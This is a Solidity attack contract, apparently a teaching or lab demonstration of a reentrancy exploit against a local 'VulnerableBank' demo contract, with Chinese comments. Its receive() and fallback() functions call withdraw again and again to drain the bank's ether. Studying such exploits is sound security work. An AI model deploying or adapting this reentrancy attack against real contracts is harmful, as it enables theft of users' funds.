// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./victim.sol";

contract Attack {
    VulnerableBank public vulnerableBank;
    uint256 public attackAmount;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
    }

    // 先存一点钱，方便触发 withdraw
    function depositToBank() external payable {
        vulnerableBank.deposit{value: msg.value}();
    }

    // 发起攻击
    function attack(uint256 _amount) external {
        attackAmount = _amount;
        vulnerableBank.withdraw(_amount);
    }

    // 关键：fallback 函数被调用时再次重入
    receive() external payable {
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}